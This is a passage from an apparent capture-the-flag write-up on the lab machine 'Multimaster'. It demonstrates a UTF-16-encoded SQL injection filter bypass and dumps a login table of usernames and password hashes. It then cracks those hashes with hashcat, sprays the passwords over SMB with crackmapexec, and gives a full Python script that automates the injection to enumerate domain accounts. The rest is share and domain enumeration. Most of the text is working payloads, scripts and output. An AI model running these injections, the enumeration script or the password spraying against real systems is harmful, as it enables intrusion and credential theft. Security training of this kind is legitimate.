User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 17
Origin: http://multimaster.megacorp.local
Connection: close
Referer: http://multimaster.megacorp.local/

{
	"name": "'"
}
```

![](images/Pasted%20image%2020211123114137.png)

Since the injection payload is in the body of a JSON string, it is possible to bypass the SQL injection filter by [UTF-16-encoding](https://convertcodes.com/utf16-encode-decode-convert-string/) the payload. For example, sending the payload `%' UNION SELECT 18,@@version,null,null,null;--` UTF-16-encoded yields the following response, indicating the target database server is Microsoft SQL Server 2017.

```json
...
{
    "id": 18,
    "name": "Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n",
    "position": "",
    "email": "",
    "src": ""
}
...
```

Enumerate the database tables with the query `%' UNION SELECT 18,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,TABLE_TYPE FROM information_schema.tables;--`. There are two tables: `Colleagues` and `Logins`.

```json
...
    {
        "id": 18,
        "name": "Hub_DB",
        "position": "dbo",
        "email": "Colleagues",
        "src": "BASE TABLE"
    },
    {
        "id": 18,
        "name": "Hub_DB",
        "position": "dbo",
        "email": "Logins",
        "src": "BASE TABLE"
    }
...
```

Enumerate the `Colleagues` table's columns with the query `%' UNION SELECT 18,COLUMN_NAME,DATA_TYPE,null,null FROM information_schema.columns where TABLE_NAME = 'Colleagues';--`. There are three columns: `email`, `id`, and `image`. Nothing new here.

```json
...
	{
        "id": 18,
        "name": "email",
        "position": "varchar",
        "email": "",
        "src": ""
    },
    {
        "id": 18,
        "name": "id",
        "position": "int",
        "email": "",
        "src": ""
    },
    {
        "id": 18,
        "name": "image",
        "position": "varchar",
        "email": "",
        "src": ""
    }
...
```

Enumerate the `Logins` table's columns with the query `%' UNION SELECT 18,COLUMN_NAME,DATA_TYPE,null,null FROM information_schema.columns where TABLE_NAME = 'Logins';--`. There are three columns: `id`, `username`, and `password`.

```json
...
	{
        "id": 18,
        "name": "id",
        "position": "int",
        "email": "",
        "src": ""
    },
    {
        "id": 18,
        "name": "password",
        "position": "varchar",
        "email": "",
        "src": ""
    },
    {
        "id": 18,
        "name": "username",
        "position": "varchar",
        "email": "",
        "src": ""
    }
...
```

Dump the `Logins` table with the query `%' UNION SELECT id,username,password,null,null FROM Logins;--`. Each entry appears to contain a password hash.

```json
...
	{
        "id": 1,
        "name": "sbauer",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 2,
        "name": "okent",
        "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "email": "",
        "src": ""
    },
    {
        "id": 3,
        "name": "ckane",
        "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "email": "",
        "src": ""
    },
    {
        "id": 4,
        "name": "kpage",
        "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "email": "",
        "src": ""
    },
    {
        "id": 5,
        "name": "shayna",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 6,
        "name": "james",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 7,
        "name": "cyork",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 8,
        "name": "rmartin",
        "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "email": "",
        "src": ""
    },
    {
        "id": 9,
        "name": "zac",
        "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "email": "",
        "src": ""
    },
    {
        "id": 10,
        "name": "jorden",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 11,
        "name": "alyx",
        "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "email": "",
        "src": ""
    },
    {
        "id": 12,
        "name": "ilee",
        "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "email": "",
        "src": ""
    },
    {
        "id": 13,
        "name": "nbourne",
        "position": "fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa",
        "email": "",
        "src": ""
    },
    {
        "id": 14,
        "name": "zpowers",
        "position": "68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813",
        "email": "",
        "src": ""
    },
    {
        "id": 15,
        "name": "aldom",
        "position": "9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739",
        "email": "",
        "src": ""
    },
    {
        "id": 16,
        "name": "minatotw",
        "position": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
        "email": "",
        "src": ""
    },
    {
        "id": 17,
        "name": "egre55",
        "position": "cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc",
        "email": "",
        "src": ""
    }
...
```

---

## Cracking the MSSQL Hashes

Extract the hashes from the JSON data.

```bash
$ cat logins.json | jq -r '.[].position' > multimaster-logins-hashes.txt
$ cat multimaster-logins-hashes.txt
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739
cf17bb4919cab4729d835e734825ef16d47de2d9615733fcba3b6e0a7aa7c53edd986b64bf715d0a2df0015fd090babc
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa
```


According to [Name That Hash](https://nth.skerritt.blog/), the hashes appear to be SHA-384 with a `hashcat` mode of 10800. However, this mode fails to crack any of the hashes. The target hashes are 96 characters long. Extract all the 96-character long hashes from `hashcat --example-hashes` with the following script.

```python
# hashes.py
import json
import subprocess
from typing import List

output: str = subprocess.getoutput("hashcat --example-hashes")
hash_modes: List[dict] = []
for i, mode in enumerate(output.split('\n\n')):
    if i == 0:
        continue
    attrs: List[str] = mode.split('\n')
    if len(attrs) == 4:
        hash_modes.append({
            "mode": attrs[0].split()[1],
            "type": attrs[1].split()[1],
            "hash": attrs[2].split()[1],
            "pass": attrs[3].split()[1]
        })

hash_modes_len_96 = [hash_mode for hash_mode in hash_modes if len(hash_mode['hash']) == 96]
print(json.dumps(hash_modes_len_96))
```

```bash
$ python3 hashes.py | jq                                                                                                                            130 ⨯
[
  {
    "mode": "10800",
    "type": "SHA2-384",
    "hash": "07371af1ca1fca7c6941d2399f3610f1e392c56c6d73fddffe38f18c430a2817028dae1ef09ac683b62148a2c8757f42",
    "pass": "hashcat"
  },
  {
    "mode": "13000",
    "type": "RAR5",
    "hash": "$rar5$16$38466361001011015181344360681307$15$00000000000000000000000000000000$8$cc7a30583e62676a",
    "pass": "hashcat"
  },
  {
    "mode": "17500",
    "type": "SHA3-384",
    "hash": "983ba28532cc6320d04f20fa485bcedb38bddb666eca5f1e5aa279ff1c6244fe5f83cf4bbf05b95ff378dd2353617221",
    "pass": "hashcat"
  },
  {
    "mode": "17900",
    "type": "Keccak-384",
    "hash": "5804b7ada5806ba79540100e9a7ef493654ff2a21d94d4f2ce4bf69abda5d94bf03701fe9525a15dfdc625bfbd769701",
    "pass": "hashcat"
  }
]
```

The `RAR5` hash doesn't match the recovered hashes, but it looks like `SHA3-384` and `Keccak-384` could work. Attempting both reveals that the hashes were `Keccack-384` and three of them were recoverable by `hashcat`.

```bash
$ hashcat -a 0 -m 17900 multimaster-logins-hashes.txt rockyou.txt
9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
```

`aldom`, `jorden`, `cyork`, `james`, `shayna`, and `sbauer` all have the password `password1`.

`zpowers`, `ilee`, `zac`, `kpage`, and `ckane` all have the password `finance1`.

`nbourne`, `alyx`, `okent` all have the password `banking1`.

However, passing these passwords to the domain controller indicates that none of the credentials are valid.

```bash
$ crackmapexec smb 10.129.95.200 -d megacorp.local -u users.txt -p passwords.txt
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:megacorp.local) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\james:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\james:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\james:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\kpage:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\kpage:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\kpage:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zac:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zac:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zac:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\rmartin:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\rmartin:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\rmartin:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\sbauer:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\sbauer:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\sbauer:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\jorden:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\jorden:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\jorden:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\okent:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\okent:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\okent:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\alyx:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\alyx:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\alyx:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ckane:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ckane:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ckane:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\nbourne:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\nbourne:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\nbourne:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ilee:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ilee:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\ilee:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\aldom:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\aldom:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\aldom:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zpowers:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zpowers:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\zpowers:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\cyork:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\cyork:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\cyork:banking1 STATUS_LOGON_FAILURE
```

---

## MSSQL Injection Domain User Enumeration

With SQL command execution access to a domain-joined SQL server, it is possible to enumerate domain principals by using [this technique](https://www.netspi.com/blog/technical/network-penetration-testing/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/).

The technique begins by using injecting MSSQL's `DEFAULT_DOMAIN()` function to retrieve the domain name. The result was `MEGACORP`.

The next step was to determine the domain SID by injecting the `SUSER_SID('MEGACORP\Administrator')` function to determine the RID of the domain administrator. However, the result was coming back as type `VARBINARY` from the database and as a result was mangling the response. To get around this, it was necessary to determine the length of the domain administrator's RID by injecting `DATALENGTH(SUSER_SID('MEGACORP\Administrator'))` which indiated a length of 28 bytes. By injecting `CONVERT(INT, SUBSTRING(SUSER_SID('MEGACORP\Administrator'), $i, 1))` and iterating over the length of the SID with each index as `$i`, it was possible to extract the domain administrator's RID byte by byte, for a total of 28 bytes. The domain SID is the first 24 of these bytes. In hex: `0x0105000000000005150000001c00d1bcd181f1492bdfc236`.

With the domain SID in hand, all that was left was to iterate through possible RID values. Append each to the end of the domain SID to create a domain principal SID, and then inject the MSSQL function `SUSER_SNAME($DOMAIN_PRINCIPAL_RID)` to discover the corresponding domain principal. The tricky part is the fact that the RID must converted into an 8-byte, little endian hex value before being appended to the domain SID.

The following script automates this process and keeps its findings in the local file `.sqli.json`.

```python
# domain-user-enum.py
import json
import os
import time

import requests


api_url = "http://multimaster.megacorp.local/api/getColleagues"
header = {"Content-Type": "application/json"}


def to_utf16(string: str) -> str:
    return "".join(['\\u' + hex(ord(character)).replace('0x', '').zfill(4) for character in string])


def sqli(statement: str) -> str:
    injection = f"woo' UNION SELECT 18,{statement},null,null,null;--"
    body = f'{{"name": "{to_utf16(injection)}"}}'
    with requests.post(api_url, data=body, headers=header) as response:
        assert response.status_code == 200, response.text
        return response.json()[0]['name']


def get_domain_sid(domain_name: str) -> str:
    sid = ""
    sid_length = int(sqli(f"DATALENGTH(SUSER_SID('{domain_name}\\Administrator'))"))
    for i in range(sid_length):
        character: bytes = sqli(f"CONVERT(INT, SUBSTRING(SUSER_SID('{domain_name}\\Administrator'), {i+1}, 1))")
        sid += '0x{0:0{1}x}'.format(int(character), 2).replace('0x', '')
        time.sleep(2)
    return '0x' + sid[:48]


def main():

    output = {}

    # Read previously enumerated users, if any
    if os.path.exists(".sqli.json"):
        with open(".sqli.json") as f:
            output: dict = json.load(f)
    else:
        output = {
            "domain_name": "",
            "domain_sid": "",
            "principals": {}
        }
        
    # Retrieve the domain name
    if not output["domain_name"]:
        output["domain_name"] = sqli("DEFAULT_DOMAIN()")
        print(f"[*] Retrieved domain name: {output['domain_name']}")

    # Retrieve the domain SID
    if not output["domain_sid"]:
        output["domain_sid"] = get_domain_sid(output["domain_name"])
        print(f"[*] Retrieved domain SID: {output['domain_sid']}")

    # Brute force domain RIDs
    begin = 500
    end = 1200
    print(f"[*] Enumerating domain users with SID relative identifiers from {begin} to {end-1}")
    for i in range(begin, end):
        if str(i) not in output["principals"]:
            print(f"[*] Retrieving domain user with SID relative identifier of {i}", end='\r')

            # Translate the integer RID into little endian hex
            hx: str = hex(i).replace('0x', '').zfill(4)
            hx: str = hx[2:4] + hx[:2]
            hx: str = hx + '0000'
            principal_rid: str = output["domain_sid"] + hx

            # Attempt to retrieve the domain principal associated with the RID
            name: str = sqli(f"SUSER_SNAME({principal_rid})")
            if name:
                output["principals"][str(i)] = {
                    "rid": principal_rid,
                    "name": name,
                    "relative_identifier": i
                }
                with open(".sqli.json", "w") as f:
                    json.dump(output, f, indent=3)
            time.sleep(2)

    print(json.dumps(output, indent=3))


main()
```

The script found several new domain principals, including `svc-nas`, `andrew`, `tushikikatomo`, and `lana`.

```bash
$ cat .sqli.json | jq '.principals | to_entries | .[].value.name'
"MEGACORP\\Administrator"
"MEGACORP\\Guest"
"MEGACORP\\krbtgt"
"MEGACORP\\DefaultAccount"
"MEGACORP\\Domain Admins"
"MEGACORP\\Domain Users"
"MEGACORP\\Domain Guests"
"MEGACORP\\Domain Computers"
"MEGACORP\\Domain Controllers"
"MEGACORP\\Cert Publishers"
"MEGACORP\\Schema Admins"
"MEGACORP\\Enterprise Admins"
"MEGACORP\\Group Policy Creator Owners"
"MEGACORP\\Read-only Domain Controllers"
"MEGACORP\\Cloneable Domain Controllers"
"MEGACORP\\Protected Users"
"MEGACORP\\Key Admins"
"MEGACORP\\Enterprise Key Admins"
"MEGACORP\\RAS and IAS Servers"
"MEGACORP\\Allowed RODC Password Replication Group"
"MEGACORP\\Denied RODC Password Replication Group"
"MEGACORP\\MULTIMASTER$"
"MEGACORP\\DnsAdmins"
"MEGACORP\\DnsUpdateProxy"
"MEGACORP\\svc-nas"
"MEGACORP\\Privileged IT Accounts"
"MEGACORP\\tushikikatomo"
"MEGACORP\\andrew"
"MEGACORP\\lana"
```

Use `crackmapexec` to see if any of the discovered passwords belong to any of these new users. It looks like the credential `tushikikatomo`:`finance1` is valid.

```bash
$ crackmapexec smb 10.129.95.200 -d megacorp.local -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.95.200   445    MULTIMASTER      [*] Windows Server 2016 Standard 14393 x64 (name:MULTIMASTER) (domain:megacorp.local) (signing:True) (SMBv1:True)
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\tushikikatomo:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [+] megacorp.local\tushikikatomo:finance1
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\tushikikatomo:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\andrew:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\andrew:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\andrew:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\lana:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\lana:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\lana:banking1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\svc-nas:password1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\svc-nas:finance1 STATUS_LOGON_FAILURE
SMB         10.129.95.200   445    MULTIMASTER      [-] megacorp.local\svc-nas:banking1 STATUS_LOGON_FAILURE
```

---

## SMB Enumeration as `tushikikatomo`

`tushikikatomo` has access to the `dfs`, `IPC$`, `NETLOGON`, and `SYSVOL` shares.

```bash
$ smbmap -u "tushikikatomo" -p "finance1" -P 445 -H 10.129.95.200
[+] IP: 10.129.95.200:445       Name: multimaster.megacorp.local
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Development                                             NO ACCESS
        dfs                                                     READ ONLY
        E$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
```

### `dfs`

Attempting to connect to the `dfs` share results in an interesting error message that references the hostname `fsmo.megacorp.local`.

```bash
$ smbclient -U megacorp.local/tushikikatomo //10.129.95.200/dfs
Enter MEGACORP.LOCAL\tushikikatomo's password:
do_connect: Connection to FSMO.MEGACORP.LOCAL failed (Error NT_STATUS_UNSUCCESSFUL)
```

Adding a DNS entry for `fsmo.megacorp.local` and reattempting the connection with that domain name works. There is a folder named `Development`.

```bash
$ smbclient -U megacorp.local/tushikikatomo //fsmo.megacorp.local/dfs
Enter MEGACORP.LOCAL\tushikikatomo's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 25 14:49:30 2019
  ..                                  D        0  Wed Sep 25 14:49:30 2019
  Development                        Dr        0  Wed Sep 25 14:49:30 2019

                5359871 blocks of size 4096. 1621549 blocks available
```

However, changing into the `Development` folder and attempting to list it results in an access denied error.

```bash
smb: \Development\> ls
NT_STATUS_ACCESS_DENIED listing \*
```

### `IPC$`

Unable to list the `IPC$` share.

```bash
$ smbclient -U megacorp.local/tushikikatomo //10.129.95.200/IPC\$
Enter MEGACORP.LOCAL\tushikikatomo's password:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_INVALID_INFO_CLASS listing \*
```

### `NETLOGON`

Nothing in the `NETLOGON` share.

```bash
$ smbclient -U megacorp.local/tushikikatomo //10.129.95.200/NETLOGON
Enter MEGACORP.LOCAL\tushikikatomo's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan  9 19:42:19 2020
  ..                                  D        0  Thu Jan  9 19:42:19 2020

                5359871 blocks of size 4096. 1608378 blocks available
```

### `SYSVOL`

```bash
$ smbclient -U megacorp.local/tushikikatomo //10.129.95.200/SYSVOL
Enter MEGACORP.LOCAL\tushikikatomo's password:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep 25 09:19:12 2019
  ..                                  D        0  Wed Sep 25 09:19:12 2019
  MEGACORP.LOCAL                     Dr        0  Wed Sep 25 09:19:12 2019

                5359871 blocks of size 4096. 1608378 blocks available
```

Unable to retrieve an GPP credentials in `SYSVOL`.

```bash
msf6 auxiliary(scanner/smb/smb_enum_gpp) > options

Module options (auxiliary/scanner/smb/smb_enum_gpp):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     10.129.95.200    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      445              yes       The Target port (TCP)
   SMBDomain  megacorp.local   no        The Windows domain to use for authentication
   SMBPass    finance1         no        The password for the specified username
   SMBSHARE   SYSVOL           yes       The name of the share on the server
   SMBUser    tushikikatomo    no        The username to authenticate as
   STORE      false            yes       Store the enumerated files in loot.
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_enum_gpp) > run

[*] 10.129.95.200:445     - Connecting to the server...
[*] 10.129.95.200:445     - Mounting the remote share \\10.129.95.200\SYSVOL'...
[*] 10.129.95.200:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

---

## Domain Enumeration as `tushikikatomo`

### Domain Controllers

The target domain controller has three DNS hostnames: `CATCH$`, `FSMO$`, and `MULTIMASTER$`. Operating system is Windows Server 2016, so not vulnerable to MS14-068.

```bash
$ pywerview get-netdomaincontroller -w megacorp.local -u tushikikatomo -p finance1 --dc-ip 10.129.95.200 -d megacorp.local
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            MULTIMASTER
codepage:                      0
countrycode:                   0
displayname:                   MULTIMASTER$
distinguishedname:             CN=MULTIMASTER,OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
dnshostname:                   MULTIMASTER.MEGACORP.LOCAL
dscorepropagationdata:         2019-09-28 21:09:32,
                               2019-09-25 21:27:58,
                               2019-09-25 13:20:06,
                               1601-01-01 18:16:33
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-11-24 18:04:49.556695
lastlogontimestamp:            132822399166853568
localpolicyflags:              0
logoncount:                    381
msdfsr-computerreferencebl:    CN=FSMO,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=MEGACORP,DC=LOCAL
msds-additionaldnshostname:    CATCH$,
                               FSMO$,
                               MULTIMASTER$
msds-generationid:             35,
                               1,
                               20,
                               79,
                               76,
                               206,
                               185,
                               244
msds-supportedencryptiontypes: 28
name:                          MULTIMASTER
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=MEGACORP,DC=LOCAL
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    15fee192-c56e-4a55-b'b04f'-0019ad2d038c
objectsid:                     S-1-5-21-3167813660-1240564177-918740779-1000
operatingsystem:               Windows Server 2016 Standard
operatingsystemversion:        10.0 (14393)
primarygroupid:                516
pwdlastset:                    2021-11-24 10:05:04.982208
ridsetreferences:              CN=RID Set,CN=MULTIMASTER,OU=Domain Controllers,DC=MEGACORP,DC=LOCAL
samaccountname:                MULTIMASTER$
samaccounttype:                805306369
serverreferencebl:             CN=MULTIMASTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=MEGACORP,DC=LOCAL
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/MULTIMASTER.MEGACORP.LOCAL,
                               TERMSRV/MULTIMASTER,
                               TERMSRV/MULTIMASTER.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/ForestDnsZones.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/DomainDnsZones.MEGACORP.LOCAL,
                               DNS/MULTIMASTER.MEGACORP.LOCAL,
                               GC/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               RestrictedKrbHost/MULTIMASTER.MEGACORP.LOCAL,
                               HOST/MULTIMASTER.MEGACORP.LOCAL/MEGACORP,
                               HOST/MULTIMASTER.MEGACORP.LOCAL,
                               HOST/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/MEGACORP,
                               ldap/MULTIMASTER.MEGACORP.LOCAL,
                               ldap/MULTIMASTER.MEGACORP.LOCAL/MEGACORP.LOCAL,
                               ldap/CATCH/ForestDnsZones.MEGACORP.LOCAL,
                               HOST/CATCH/MEGACORP.LOCAL,
                               ldap/CATCH/DomainDnsZones.MEGACORP.LOCAL,
                               GC/CATCH/MEGACORP.LOCAL,
                               ldap/CATCH/MEGACORP.LOCAL,
                               HOST/CATCH/MEGACORP,
                               ldap/CATCH/MEGACORP,
                               RestrictedKrbHost/CATCH,
                               HOST/CATCH,
                               ldap/CATCH,
                               ldap/FSMO/MEGACORP,
                               HOST/FSMO/MEGACORP.LOCAL,
                               ldap/FSMO/ForestDnsZones.MEGACORP.LOCAL,
                               HOST/FSMO/MEGACORP,
                               ldap/MULTIMASTER/ForestDnsZones.MEGACORP.LOCAL,
                               ldap/FSMO/DomainDnsZones.MEGACORP.LOCAL,
                               HOST/MULTIMASTER/MEGACORP.LOCAL,
                               ldap/MULTIMASTER/DomainDnsZones.MEGACORP.LOCAL,
                               GC/MULTIMASTER/MEGACORP.LOCAL,
                               ldap/FSMO/MEGACORP.LOCAL,
                               GC/FSMO/MEGACORP.LOCAL,
                               ldap/MULTIMASTER/MEGACORP.LOCAL,
                               RestrictedKrbHost/FSMO,
                               HOST/FSMO,
                               ldap/FSMO,
                               HOST/MULTIMASTER/MEGACORP,
                               ldap/MULTIMASTER/MEGACORP,
                               RestrictedKrbHost/MULTIMASTER,
                               HOST/MULTIMASTER,
                               ldap/MULTIMASTER,
                               RPC/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869._msdcs.MEGACORP.LOCAL,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/cc4f3c4e-7c1c-40be-9aa9-3bd9a7837869/MEGACORP.LOCAL,
